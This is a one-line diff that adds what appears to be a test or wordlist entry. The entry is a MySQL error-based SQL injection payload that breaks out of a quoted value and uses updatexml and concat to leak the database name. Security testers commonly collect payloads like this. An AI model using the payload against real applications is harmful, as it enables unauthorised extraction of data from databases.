@@ -1,0 +1,1 @@
+Hyafinthus' updatexml(1,concat('#',(database())),0)--+
